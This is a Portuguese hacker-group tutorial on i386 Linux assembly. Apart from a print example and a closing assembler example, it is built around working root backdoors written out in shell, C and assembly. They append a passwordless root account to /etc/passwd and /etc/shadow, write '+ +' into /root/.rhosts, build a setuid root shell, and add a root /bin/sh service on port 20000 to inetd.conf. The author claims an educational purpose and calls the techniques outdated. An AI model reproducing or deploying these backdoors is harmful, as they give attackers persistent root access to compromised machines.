@@ -1,0 +1,870 @@
+*****************************************************************************
+***************************** UNSEKURITY TEAM *******************************
+*****************************************************************************
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+
+OBS: O autor nao se responsabiliza pelo mau uso das informacoes e dados
+     aqui disponibilizados.Todo material encontrado neste arquivo texto
+     possui somente propositos educacionais.
+
+Para o pessoal NewBie, vai alguns exemplos de alguns codigos em assembly
+que podem ser perfeitamente transformados em shellcodes.Sao soh exemplos,
+um conhecimento basico de Assembly se faz necessario.A sintaxe adotada eh
+a AT&T, o compilador(linkador) eh o GCC, e todos os exemplos sao para i386
+e Linux.
+
+
+			***************************
+			* EXEMPLOS SIMPLES EM ASM *
+			***************************
+
+---------------------------------- INDICE ----------------------------------
+Introducao
+1 - Escrevendo uma String na Tela.
+2 - Escrevendo uma String num Arquivo.
+3 - Alguns tipos de Backdoors usando Assembly.
+    3.1 - Rlogin
+    3.2 - Suid Shell
+    3.3 - Inetd
+4 - Outros Assemblers
+5 - Terminando
+    5.1 - Links e Referencias
+    5.2 - Consideracoes Finais
+----------------------------------------------------------------------------
+
+			        ------------
+			       | Introducao |
+			        ------------
+
+Muita gente tem buscado aprender mais sobre assembly.No momento estou
+engajado ateh o pescoco em alguns projetos, de modo que nao posso fazer um
+tutorial.Tambem fiquei sabendo que um amigo de um grupo proximo estah
+preparando material sobre isso, entao pretendo esperar mais um pouco.Se
+daqui ateh o termino de alguns tutoriais e projetos, ainda existir a 
+necessidade crescente de um tutorial mais amplo sobre ASM, talvez eu escreva
+algo nesse sentido.O que veremos aqui sao soh alguns exemplos de codigos
+ASM usados por Fucadores para alguns objetivos.Coisa basica, e explicada
+detalhadamente para facilitar ao maximo a total compreensao do que os
+codigos realmente estao fazendo.Farei os exemplos em .s que eh a notacao
+usada para designar arquivos de codigo-fonte da Linguagem Assembly, mas
+os meus exemplos seguirao em GCC, logo, a funcao principal(requerida em
+programas .c e nao em .s) eh a main.Caso nao possua GCC procure informacoes
+sobre outros programas capazes de linkar codigo em Assembly, como o NASM.
+Escolhi GCC porque eh o mais encontrado, toda distribuicao descente do
+Linux, possui ele, e tambem porque no Assembly HOWTO, nao tem um escopo
+sobre como trabalhar com ASM usando o GCC.
+Um escopo da construcao de um .s para um arquivo com codigos Assembly segue
+abaixo:
+
+        .file   "arquivo.s"
+        .version        "01.01"
+gcc2_compiled.:
+.section        .rodata
+
+(DADOS ESTATICOS)
+
+.text
+        .align 4
+.globl main
+        .type    main,@function
+main:
+
+(CODIGOS DE EXECUCAO)
+
+.L1:
+        leave
+        ret
+.Lfe1:
+        .size    main,.Lfe1-main
+        .ident  "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)"
+
+Mais abaixo veremos exemplos usando este escopo para construirmos nossos
+arquivos .s.Para conhecimentos sobre operandos, instrucoes e suas respectivas
+sintaxe, eu recomendo a leitura dos capitulos iniciais do 'Tutorial Basico
+de Escrita de Shellcodes para Linux' feito por mim e que pode se obtido na
+home page do Unsekurity Team, lah tambem existem diversos links onde se pode
+obter mais material e informacoes sobre Assembly.
+
+
+----------------------------------
+1 - Escrevendo uma String na Tela |
+----------------------------------
+
+Antes de dar inicio ao exemplo alguns passos serao seguidos, para facilitar
+mais ainda o aprendizado.Qualquer duvida quanto aos systemcalls confira no
+seu arquivo /usr/include/asm/unistd.h (kerneis novos), qualquer duvida
+referente a uma 'funcao'(prototipo do systemcall) procure antes nas man 
+pages.A Sintaxe de algumas delas se encontram nas man pages.
+
+Vamos entao ao nosso primeiro exemplo.
+
+Tabela de System calls necessarios:
+
++----------------------------------------------------------------------+
+|     Nome    | Numero do System Call |    Prototipo do System Call    |
++----------------------------------------------------------------------+
+| __NR_write  |          4            |  write(arquivo,texto,tam_texto |
++----------------------------------------------------------------------+
+| __NR_exit   |          1            |          exit(status)          |
++----------------------------------------------------------------------+
+
+Em Shell Script poderiamos ter:
+
+# /bin/echo 'Unsekurity Team'
+
+Em um arquivo .c deveriamos fazer somente:
+
+#include <stdio.h>
+
+main(){
+write(1,"Unsekurity Team\n",17);
+exit(0);
+}
+
+Em Assembly Teriamos o esquema abaixo(Feito originalmente pelo module do
+Unsekurity Team):
+
+---------------------------- imprime.s --------------------------------
+
+        .file   "imprime.s"
+        .version        "01.01"
+gcc2_compiled.:
+.section        .rodata
+
+.frase:
+        .string "Unsekurity Team\n"
+
+.text
+        .align 4
+.globl main
+        .type    main,@function
+main:
+
+pushl %ebp
+movl %esp,%ebp
+movl $4, %eax
+movl $1, %ebx
+movl $.frase, %ecx
+movl $16, %edx
+int $0x80
+movl $0x0, %ebx
+movl $0x1, %eax
+int $0x80
+
+.L1:
+        leave
+        ret
+.Lfe1:
+        .size    main,.Lfe1-main
+        .ident  "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)"
+
+----------------------------------------------------------------------------
+
+Compile ele da seguinte forma:
+
+# gcc -o imprime -g imprime.s
+
+Depois eh soh executar e ver o resultado.
+
+Vamos analisar o codigo asm usado acima:
+
+pushl %ebp
+movl %esp,%ebp
+
+As duas linhas acima se referem ao procedimento preludio.Se voce leu os
+tutoriais de shellcode e overflow, sabe muito bem o que eh isso.Salva o
+Velho frame pointer, e faz do atual frame pointer o atual stack pointer.
+
+movl $4, %eax
+
+Coloca o system call de write(4) em EAX.
+
+movl $1, %ebx
+
+Coloca o primeiro argumento usado em nosso esquema para write(1) em EBX.
+
+movl $.frase, %ecx
+
+Copia nosso segundo argumento para write(Unsekurity Team\n) para ECX.
+
+movl $16, %edx
+
+Copia nosso terceiro argumento para write, o tamanho da string que queremos
+imprimir + 1.Em C teriamos 17, aqui em asm a propria instrucao .string 
+tambem eh contada, mas os argumentos como \n sao do compilador, logo
+teremos 16.
+
+int $0x80
+
+Sai para modo kernel.Aqui as informacoes sao processadas.
+
+movl $0x0, %ebx
+movl $0x1, %eax
+
+Na primeira linha, 0x0 eh copiado para EBX.E na segunda senha o system
+call 0x1 eh copiado para EAX, logo teremos a execucao do codigo
+correspondente a exit(0).
+
+int $0x80
+
+Sai para modo kernel.
+
+Aih estah um simples exemplo, mas nos podemos ir mais alem do que isto.
+Como voce pode notar, o numero do system call eh copiado para EAX, os
+argumentos para EBX, ECX e EDX, respectivamente.Em alguns casos onde existem
+mais de 3 argumentos necessarios, pode ser necessario armazenar os argumentos
+na memoria do usuario(User-Space) e armazenar o endereco dos argumentos nos
+registradores.
+
+Veremos algumas coisas mais uteis para um fucador mais abaixo.
+
+--------------------------------------
+2 - Escrevendo uma String num Arquivo |
+--------------------------------------
+
+Tabela de System calls necessarios:
+
++----------------------------------------------------------------------+
+|     Nome    | Numero do System Call |    Prototipo do System Call    |  
++----------------------------------------------------------------------+
+|  __NR_open  |          5            |      open(arquivo,modo)        |
++----------------------------------------------------------------------+
+| __NR_write  |          4            |  write(arquivo,texto,tam_texto |
++----------------------------------------------------------------------+
+| __NR_exit   |          1            |          exit(status)          |
++----------------------------------------------------------------------+
+
+Num Shell Script poderiamos ter:
+
+# /bin/echo 'NashLeon::0:0:Nash Leon:/:/bin/sh' >> /etc/passwd
+
+Num .c fariamos algo como:
+
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+main(){
+int arquivo;
+arquivo = open("/etc/passwd",O_RDWR|O_NONBLOCK|O_APPEND);
+write(arquivo,"NashLeon::0:0:Nash Leon:/:/bin/sh",33);
+exit(0);
+}
+
+O arquivo em Assembly segue abaixo:
+
+----------------------------- escreve1.s --------------------------------
+        .file   "escreve1.s"
+        .version        "01.01"
+gcc2_compiled.:
+.section        .rodata
+
+.arquivo:
+        .string "/etc/passwd"
+
+.escreve:
+        .string "NashLeon::0:0:Nash Leon:/:/bin/sh"
+
+.text
+        .align 4
+.globl main
+        .type    main,@function
+main:
+
+pushl %ebp             #__ Procedimento
+movl %esp,%ebp         #   Preludio
+movl $5, %eax          #
+movl $.arquivo, %ebx   # open("/etc/passwd",O_RDWR|O_NONBLOCK|O_APPEND);
+movw $0xc02, %ecx      #
+int $0x80              # Sai para modo kernel.
+movl %eax, %ebx        # Salva dados obtidos com open p/ usar em write.
+movl $.escreve, %ecx   #-
+movl $34, %edx         # |-> write(arquivo,texto,tamanho_do_texto);
+movl $4, %eax          #-
+int $0x80              # Sai para modo kernel.
+movl $0x0, %ebx        #
+movl $0x1, %eax        # exit(0)
+int $0x80              # Sai para modo kernel.
+
+.L1:
+        leave
+        ret
+.Lfe1:
+        .size    main,.Lfe1-main
+        .ident  "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)"
+
+--------------------------------------------------------------------------
+
+Nao tem muito segredo mano.Abaixo segue um exemplo mais completo onde se
+abre o /etc/passwd e o /etc/shadow e acrescenta strings nos dois arquivos.
+
+------------------------------ escreve2.s -------------------------------
+        .file   "escreve2.s"
+        .version        "01.01"
+gcc2_compiled.:
+.section        .rodata
+
+.arquivo1:
+        .string "/etc/passwd"
+
+.arquivo2:
+        .string "/etc/shadow"
+
+.escreve1:
+        .string "NashLeon::0:0:Nash Leon:/:/bin/sh"
+
+.escreve2:
+        .string "NashLeon::11120:0:::::"
+
+.text
+        .align 4
+.globl main
+        .type    main,@function
+main:
+
+pushl %ebp      # Procedimento Preludio - salva o velho stack pointer.
+movl %esp,%ebp  # Faz do frame pointer o novo stack pointer.
+movl $5, %eax   # open = systemcall de numero 5.
+movl $.arquivo1, %ebx # copia .arquivo1 para %ebx - open("/etc/passwd",..)
+movw $0xc02, %ecx # 0xc02 = argumento O_RDWR|O_NONBLOCK|O_APPEND.
+int $0x80       # Sai para o modo kernel
+movl %eax, %ebx # Salva os dados de open em EBX para usar em write.
+movl $.escreve1, %ecx # copia string para ECX.
+movl $34, %edx # tamanho de .string "NashLeon...."
+movl $4, %eax  # 4 para write. write(fd,texto,tamanho_do_texto)
+int $0x80      # Sai para modo kernel.Abaixo segue tudo novamente.
+movl $5, %eax
+movl $.arquivo2, %ebx
+movw $0xc02, %ecx
+int $0x80
+movl %eax, %ebx
+movl $.escreve2, %ecx
+movl $23, %edx
+movl $4, %eax
+int $0x80
+movl $0x0, %ebx # Exit(0)
+movl $0x1, %eax #
+int $0x80
+
+.L1:
+        leave
+        ret
+.Lfe1:
+        .size    main,.Lfe1-main
+        .ident  "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)"
+
+-----------------------------------------------------------------------------
+
+Aih estah.Voce jah sabe como escrever num arquivo.Esse exemplo acima pode
+ser usado como uma backdoor, no proximo item veremos mais alguns exemplos
+simples de backdoors, escrevendo-as em assembly.
+
+----------------------------------------------
+3 - Alguns tipos de Backdoors usando Assembly |
+----------------------------------------------
+
+Os exemplos disponibilizados aqui sao simples.Se voce tem alguma duvida
+quanto a execucao de uma backdoor, ou o que ela faz, para que serve, essas
+coisas, de uma olhada num tutorial que disponibilizo na pagina do Unsekurity
+Team.
+
+3.1 - Rlogin
+-------------
+
+Se voce conseguiu captar os exemplos descritos acima, essa backdoor vai ser
+moleza.
+
+Tabela de System calls necessarios:
+
++----------------------------------------------------------------------+
+|     Nome    | Numero do System Call |    Prototipo do System Call    |
++----------------------------------------------------------------------+
+|  __NR_open  |          5            |      open(arquivo,modo)        |
++----------------------------------------------------------------------+
+| __NR_write  |          4            |  write(arquivo,texto,tam_texto |
++----------------------------------------------------------------------+
+| __NR_exit   |          1            |          exit(status)          |
++----------------------------------------------------------------------+
+
+Exemplo simples em shell script:
+
+# /bin/echo '+ +' > /root/.rhosts
+
+Num .c poderia ser:
+
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+main(){
+int arquivo;
+arquivo = open("/root/.rhosts",O_RDWR|O_NONBLOCK|O_CREAT);
+write(arquivo,"+ +",3);
+exit(0);
+}
+
+Em assembly, nao tem muito segredo.Vejamos:
+
+------------------------------ back1.s --------------------------------
+
+        .file   "back1.s"
+        .version        "01.01"
+gcc2_compiled.:
+.section        .rodata
+
+.arquivo:
+        .string "/root/.rhosts"
+
+.escreve:
+        .string "+ +"
+
+.text
+        .align 4
+.globl main
+        .type    main,@function
+main:
+pushl %ebp      # Procedimento Preludio - salva o velho stack pointer.
+movl %esp,%ebp  # Faz do frame pointer o novo stack pointer.
+movl $5, %eax   # open = systemcall de numero 5.
+movl $.arquivo, %ebx # copia .arquivo1 para %ebx -open("/root/.rhosts",..)
+movw $0x441, %ecx # 0x441 = argumento O_RDWR|O_NONBLOCK|O_CREAT.
+int $0x80       # Sai para o modo kernel
+movl %eax, %ebx # Salva os dados de open em EBX para usar em write.
+movl $.escreve, %ecx # copia string para ECX.
+movl $4, %edx # tamanho de .string "+ +"
+movl $4, %eax  # 4 para write. write(fd,texto,tamanho_do_texto)
+int $0x80      # Sai para modo kernel
+movl $0x0, %ebx # Exit(0)
+movl $0x1, %eax #
+int $0x80
+
+.L1:
+        leave
+        ret
+.Lfe1:
+        .size    main,.Lfe1-main
+        .ident  "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)"
+
+------------------------------------------------------------------------------
+
+Aih estah amigo.Como root, digite 'gcc -o back1 -g back1.s' e depois eh
+soh testar.
+
+3.2 - Suid Shell
+-----------------
+
+Tabela de System calls necessarios:
+
++----------------------------------------------------------------------+
+|     Nome    | Numero do System Call |    Prototipo do System Call    |
++----------------------------------------------------------------------+
+| __NR_execve |          11           | execve(arquivo,char *const     |
+|             |                       |        argv [], char *const    |
+|             |                       |         envp[]);               |
++----------------------------------------------------------------------+
+| __NR_setuid |          23           |       setuid(uid_t uid)        |
++----------------------------------------------------------------------+
+| __NR_exit   |          1            |          exit(status)          |
++----------------------------------------------------------------------+
+
+Vamos complicar mais um pouco.Em kerneis novos, a implementacao de getuid(),
+seteuid() tem sido efetiva em muitos casos em copia de uma root shell.
+Os comandos abaixo sao ineficazes:
+
+# cp /bin/sh /tmp/sh
+# chmod +s /tmp/sh
+
+Voce poderia tentar obter a root shell em '/tmp/sh', mas terminaria caindo
+na propria shell.Nao faco ideia no momento(nunca procurei ver!) de como se
+sair disso usando somente shell scripts(bash).
+
+Mas em C, eh facil, o programa abaixo, nos daria root shell, fugindo da
+defesa que impede o esquema acima.Vejamos:
+
+#include <stdio.h>
+#include <unistd.h>
+
+main(){
+char *comando[2];
+comando[0] = "/bin/sh";
+comando[1] = 0x0;
+setuid(0);
+execve(comando[0], comando, 0x0);
+}
+
+Compile ele normalmente e depois 'chmod +s' nele.Para construirmos ele em
+asm, devemos notar algumas coisas.Podemos ver que usamos um ponteiro para
+podermos executar o comando, por que?? Se voce executar o programa abaixo:
+
+#include <unistd.h>
+
+main(){
+setuid(0);
+execve("/bin/sh",0x0, 0x0);
+}
+
+verah que ele nao funciona.Existe a necessidade da string do comando
+(/bin/sh no caso) terminar nula.Logo mano, para construir ele em assembly
+teremos que manipular dados usando BP(Base Pointer) e o stack(SP).Existem
+outros esquemas para isso tambem, mas eu acho este mais facil.
+Abaixo segue o codigo fonte do mesmo:
+
+------------------------------ back2.s ---------------------------------
+
+        .file   "back2.s"
+        .version        "01.01"
+gcc2_compiled.:
+.section        .rodata
+
+execute:
+       .string "/bin/sh"
+
+.text
+        .align 4
+.globl main
+        .type    main,@function
+
+main:
+
+        movl $0x0, %ebx        # copia $0x0 para EBX.
+        movl $0x17,%eax        # copia $0x17 para EAX(setuid(0)).
+        int $0x80              # sai para modo kernel.
+        movl   $execute, %ebp  # copia .string /bin/sh para EBP.
+        movl   %ebp,0x8(%esp)  # copia .string /bin/sh para 0x8(%esp).
+        xorl   %eax,%eax       # reseta EAX.
+        movb   %al,0x7(%esp)   # copia /bin/sh para AL.
+        movl   %eax,0xc(%esp)  # copia /bin/sh terminado nulo para 0xc(%esp).
+        movb   $0xb,%al        # copia 0xb(execve) para AL.
+        movl   %ebp,%ebx       # copia EBP para EBX.
+        leal   0x8(%esp),%ecx  # copia 0x8(%esp) para ECX.
+        leal   0xc(%esp),%edx  # copia 0xc(%esp) para EDX.
+        int    $0x80           # sai para modo kernel.
+        movl   $0x0, %ebx      # exit(0)
+        movl   $0x1, %eax      #
+        int    $0x80           # Sai para modo kernel.
+
+.L1:
+        leave
+        ret
+.Lfe1:
+        .size    main,.Lfe1-main
+        .ident  "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)"
+
+----------------------------------------------------------------------
+
+Note que eu copiei 'execute'(.string /bin/sh) para EBP.Compile ele
+normalmente 'gcc -o back2 -g back2.s' e depois 'chmod +s' nele.
+
+Para clarear mais um pouco, abaixo segue o codigo de uma backdoor igual a
+acima, mas ao invez de /bin/sh teremos /bin/tcsh.
+
+----------------------------- back3.s -------------------------------
+
+        .file   "back3.s"
+        .version        "01.01"
+gcc2_compiled.:
+.section        .rodata
+
+execute:
+       .string "/bin/tcsh" # Tamanho = 10(a).
+
+.text
+        .align 4
+.globl main
+        .type    main,@function
+
+main:
+
+        movl $0x0, %ebx        # copia $0x0 para EBX.
+        movl $0x17,%eax        # copia $0x17 para EAX(setuid(0)).
+        int $0x80              # sai para modo kernel.
+        movl   $execute, %ebp  # copia .string /bin/tcsh para EBP.
+        movl   %ebp,0xa(%esp)  # copia .string /bin/tcsh para 0xa(%esp).
+        xorl   %eax,%eax       # reseta EAX.
+        movb   %al,0x9(%esp)   # copia /bin/tcsh para AL.
+        movl   %eax,0xe(%esp)  # copia /bin/tcsh terminado nulo para 0xe(%esp).
+        movb   $0xb,%al        # copia 0xb(execve) para AL.
+        movl   %ebp,%ebx       # copia EBP para EBX.
+        leal   0xa(%esp),%ecx  # copia 0xa(%esp) para ECX.
+        leal   0xe(%esp),%edx  # copia 0xe(%esp) para EDX.
+        int    $0x80           # sai para modo kernel.
+        movl   $0x0, %ebx      # exit(0)
+        movl   $0x1, %eax      #
+        int    $0x80           # Sai para modo kernel.
+
+
+.L1:
+        leave
+        ret
+.Lfe1:
+        .size    main,.Lfe1-main
+        .ident  "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)"
+
+---------------------------------------------------------------------------
+
+Consegue notar as diferencas?? Para '.string /bin/sh ' reservavamos
+0x8(%esp), para '.string /bin/tcsh' reservamos 0x10(%esp).Para /bin/sh
+copiamos os 7 bytes da string p/ AL, em /bin/tcsh sao 9 bytes.A string de
+/bin/sh terminada nula era 0xc(%esp), aqui temos 0xe(%esp).As strings 
+terminadas nulas sao sempre multiplos de 4.
+
+
+3.3 - Inetd
+------------
+
+Tabela de System calls necessarios:
+
++----------------------------------------------------------------------+
+|     Nome    | Numero do System Call |    Prototipo do System Call    |
++----------------------------------------------------------------------+
+| __NR_execve |          11           | execve(arquivo,char *const     |
+|             |                       |        argv [], char *const    |
+|             |                       |         envp[]);               |
++----------------------------------------------------------------------+
+|  __NR_open  |          5            |      open(arquivo,modo)        |
++----------------------------------------------------------------------+
+| __NR_write  |          4            |  write(arquivo,texto,tam_texto |
++----------------------------------------------------------------------+
+| __NR_exit   |          1            |          exit(status)          |
++----------------------------------------------------------------------+
+
+
+Existem dezenas de esquemas para se executar uma backdoor via inetd.O 
+melhor ao ver ver eh criar um arquivo com configuracoes do inetd em /tmp
+por exemplo, e depois chamar o inetd para executar o que tem lah, no
+entanto, ele eh alguns bits complicado.Irei disponibilizar um esquema mais
+simples com base no que jah vimos, acho que irah ateh servir como revisao
+do que nos jah aprendemos acima.O esquema eh acrescentar uma linha no
+/etc/inetd e depois chamar a execucao do inetd, bem simples nao?? Vejamos.
+
+Na Shell poderiamos ter algo assim:
+
+# /bin/echo '20000  stream  tcp  nowait  root /bin/sh sh' >> /etc/inetd.conf
+# /usr/sbin/inetd
+
+Em um .c poderiamos ter algo deste tipo:
+
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+main(){
+int arquivo;
+char *comando[2];
+comando[0] = "/usr/sbin/inetd";
+comando[1] = NULL;
+arquivo = open("/etc/inetd.conf",O_RDWR|O_NONBLOCK|O_APPEND);
+write(arquivo,"20000  stream  tcp  nowait  root /bin/sh sh",43);
+execve(comando[0], comando, NULL);
+}
+
+Como voce pode observar, nos abrimos o arquivo /etc/inetd.conf, escrevemos
+a string que nos interessa e depois executamos o comando /usr/sbin/inetd.
+Veremos agora, como fazer isso usando Assembly:
+
+------------------------------ back4.s --------------------------------
+
+        .file   "back4.s"
+        .version        "01.01"
+gcc2_compiled.:
+.section        .rodata
+
+execute:
+       .string "/usr/sbin/inetd"
+
+arquivo:
+
+        .string "/etc/inetd.conf"
+
+.escreve:
+
+        .string "20000  stream  tcp  nowait  root /bin/sh sh"
+.text
+        .align 4
+.globl main
+        .type    main,@function
+
+
+main:
+
+        movl $5, %eax       #
+        movl $arquivo, %ebx # -> open(arquivo,O_RDWR|O_NONBLOCK|O_APPEND)
+        movw $0xc02, %cx    #
+        int $0x80
+        movl %eax, %ebx  # Salva dados anteriores como parametro.
+        movl $.escreve, %ecx  # copia string para ECX.
+        movl $44, %edx # tamanho de .escreve
+        movl $4, %eax  # 4 para write. write(fd,texto,tamanho_do_texto)
+        int $0x80      # Sai para modo kernel
+        movl   $execute, %ebp  # Copia .string /usr/sbin/inetd para EBP.
+        movl   %ebp,0x8(%esp)  # Copia EBP para 0x8(%esp).
+        xorl   %eax,%eax       # reseta EAX.
+        movb   %al,0xf(%esp)   # copia /usr/sbin/inetd para AL.
+        movl   %eax,0xc(%esp)  # copia /usr/sbin/inetd nulo p/ 0xc(%esp).
+        movb   $0xb,%al        # copia 0xb(execve) para AL.
+        movl   %ebp,%ebx       # copia EBP para EBX.
+        leal   0x8(%esp),%ecx  # copia 0x8(%esp) para ECX.
+        leal   0xc(%esp),%edx  # copia 0xc(%esp) para EDX.
+        int    $0x80           # sai para modo kernel.
+        movl   $0x0, %ebx      # exit(0)
+        movl   $0x1, %eax      #
+        int    $0x80           # Sai para modo kernel.
+
+
+.L1:
+        leave
+        ret
+.Lfe1:
+        .size    main,.Lfe1-main
+        .ident  "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)"
+
+-----------------------------------------------------------------------------
+
+Compile este dito cujo, depois teste dando um telnet para a sua porta
+20000, poderah ver que ele funciona perfeitamente.Essas 3(4 com a do
+passwd) sao backdoors antigas e ultrapassadas, de facil percepcao, logacao
+e descoberta, nao recomendo o uso delas a nao ser para propositos
+educacionais, onde voce pode aprender o que determinada backdoor estah
+fazendo.Escreve-las em Assembly soh prova o carater educacional deste
+tutorial, lembrando que hackers sao 'praticos' ninguem ao meu ver se daria
+ao trabalho de substituir comandos do proprio shell para compilar algo
+considerado por muitos como 'super complexo'.
+
+----------------------
+4 - Outros Assemblers |
+----------------------
+
+Para portar os esquemas para outros tipos de Assemblers leia o
+Assembly-HOWTO do seu Linux, existem escopos para alguns Assemblers como
+o GAS e o NASM, bem como lah voce poderah encontrar sites aonde se pode
+encontrar esses e outros programas.
+Mas nao eh nada dificil portar, vejamos abaixo um escopo do GAS:
+
+------------------------------ gas_escopo ---------------------------
+.data
+
+(DADOS ESTATICOS)
+
+.text
+.global _start
+_start:
+
+(DADOS DINAMICOS)
+
+---------------------------------------------------------------------
+
+Um exemplo de um programa criado usando o GAS pode ser:
+
+--------------------------- despedida.s -----------------------------
+
+.data
+
+despedida:
+
+     .string       "ATE A PROXIMA NEWBIE!\n"
+
+
+  .text
+
+.global _start
+ _start:
+          movl    $24,%edx         # tamanho de .string XX
+          movl    $despedida,%ecx  # copia despedida para ECX.
+          movl    $1,%ebx          # write(arquivo,texto,tamanho)
+          movl    $4,%eax          # 4 = system call de write.
+          int     $0x80            # Sai para modo kernel.
+          movl    $0,%ebx          # exit(0)
+          movl    $1,%eax          # 1 = system call de exit.
+          int     $0x80            # Sai para modo kernel.
+
+----------------------------------------------------------------------
+
+Agora para poder compilar ele, voce deve digitar o seguinte na shell:
+
+# as -o despedida.o despedida.s
+# ld -s -o despedida despedida.o
+
+A primeira linha cria o arquivo objeto, e a segunda linka o arquivo
+objeto.Maiores detalhes digite em seu sistema 'man as' e 'man ld'.
+A execucao do dito cujo segue abaixo:
+
+[localhost]# ./despedida
+ATE A PROXIMA NEWBIE!
+[localhost]#
+
+
+---------------
+5 - Terminando |
+---------------
+
+Aih estah amigo, mais alguns exemplos para dar uma forca a quem quer aprender
+Assembly.Aos poucos a gente vai disponibilizar mais material sobre isso,
+no momento, outros projetos estao tendo prioridade, e eu tenho ralado para
+aprender mais sobre alguns esquemas 'de lo hacking' de modo que, quanto
+mais eu aprendo, mais sei que tenho mais a aprender, entao amigo, Assembly
+pode ser considerado como um A, talvez voce esteja aprendendo um A, mas
+lembre-se sempre, falta o alfabeto todo! Nao saia por aih 'esbanjando'
+conhecimento, seja humilde, o poder que esta linguagem dah ao fucador eh
+consideravel, mas nem por isso, devemos menosprezar quem nao a conhece,
+pode-se sobreviver muito bem sem saber disso.Quanto aos que nao conseguiram
+captar as informacoes desta vez, paciencia, Assembly eh mesmo complicado,
+com o tempo e dedicacao, com certeza voce aprenderah, procure outros
+materiais tambem, existe coisa boa na Internet.
+
+5.1 - Links e Referencias
+--------------------------
+
+Recomendo ir no Forum do Unsekurity Team, lah tem sido postado varios links
+onde se pode encontrar material sobre Assembly.
+
++ Home page do Unsekurity Team:
+-------------------------------
+
+http://unsekurity.virtualave.net/
+
+Recomendo a leitura dos seguintes itens:
+
+* Tutorial Basico de Backdoors - Item 'Backdoors Antigas e Ultrapassadas'.
+
+* Tutorial Basico de Escrita de Shellcodes em/para Linux - Itens Iniciais.
+
+
++ Outros Links Interessantes:
+-----------------------------
+
+http://www.taldowin.com.br
+http://www.bufferoverflow.org/
+http://www.hacker.com.br/
+http://www.absoluta.org/
+http://www.securenet.com.br/
+
+
+5.2 - Consideracoes Finais
+---------------------------
+
+Gostaria de agradecer a todo pessoal que vem acompanhando as nossas
+publicacoes, ao pessoal que tem entrado em contato comigo, aqueles que
+anonimamente colaboram com a troca de informacoes,enfim a todos que 
+de uma maneira ou de outra, compreendem o que estamos fazendo.Acho mais
+do que gratificante poder contribuir de alguma forma com a 'liberdade de
+informacao', mas reconheco que estou fazendo pouco, que ainda tem muito
+mais a fazer.Pretendo ainda escrever mais algumas coisas basicas para
+que aos poucos possamos ir avancando em tecnicas mais complexas.A
+repercussao que o hacking vem tendo na midia e etc nao eh nada boa, questao
+de tempo para 'as autoridades' virem querer silenciar todo mundo.Espero
+que mais grupos possam 'centralizar forca' divulgando massivamente o que
+""a parte podre da comunidade de seguranca"" nao quer que ninguem saiba.
+Quanto aos 'elites', parece que a coisa tem mudado atualmente...:)...
+uns nao fazem mais o que faziam em busca de fama, outros voltaram a se
+reunir na 'hora exata'..:).. outros voltaram a escrever em busca de fama,
+sei nao, acho que no fundo o pessoal jah conhece quem sao as pecas nesse
+jogo, sabemos da colaboracao de alguns bem como da inutilidade de outros,
+de qualquer forma, devemos saber 'separar o joio o trigo'.
+
+Um abraco.
+
+						Nash Leon.
+
+-------------------------------- EOF ----------------------------------
